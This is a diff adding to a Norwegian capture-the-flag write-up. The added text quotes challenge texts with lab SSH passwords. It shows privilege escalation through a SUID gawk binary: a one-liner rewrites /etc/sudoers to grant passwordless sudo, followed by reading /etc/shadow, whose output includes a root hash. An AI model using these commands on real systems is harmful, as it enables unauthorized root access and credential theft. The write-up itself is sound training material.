@@ -2,9 +2,26 @@
 
 
 ## 1.6 Unchained
+Oppgavetekst:
+````md
+# Unchained
+
+Koble til med SSH med passord: `EnergiskSkjorte`
+
+```sh
+ssh support@unchained
+```
+````
 Her var det om å lese en fil som kun root kunne lese. Det viste seg at gawk hadde SUID-bit satt, som betyr at gawk kjører med samme rettigheter som root  
 `gawk '//' secret.txt`  
 [GTFObins (ressurs for utnyttelse av binærfiler på Linux)](https://gtfobins.github.io/gtfobins/gawk/#file-read)  
+Kan også legge oss selv til i /etc/sudoers:
+```sh
+gawk -v LFILE="/etc/sudoers" '{ a[NR]=$0 } END { a[NR]="support ALL=(ALL) NOPASSWD:ALL"; for(i=1;i<=NR;i++) print a[i] > LFILE }' /etc/sudoers
+unchained:/# sudo -i
+unchained:/# cat /etc/shadow
+root:$6$etHCy/6XfmdLhSIq$ATts7G8fzbza2rah0kLaKU7rIgsQYwt2FM1M6Madizyn7E7iGL739DZz4jf2Cc7HRgunqpCFOsmuXUS3zx0qX1:20438:0:::::
+```
 
 <br>
 <br>
@@ -55,6 +72,27 @@ Besvarelsen som skulle sendes inn: `atterloom`
 <br>
 
 ## 1.10 Breakout
+Oppegavetekst:
+````md
+# Breakout
+
+Koble til med SSH:
+
+```sh
+ssh user1@breakout
+```
+
+og bruk passord: `EssensieltFantom`
+
+## Tips
+
+For å bytte bruker inne på maskinen brukes `su - brukernavn`
+
+For hver bruker leter du etter en `.txt` fil med samme navn. Denne inneholder `brukernavn:passord` for neste bruker. 
+
+I enden venter det et flagg.
+````
+
 ```sh
 breakout:~$ ls -la
 total 4
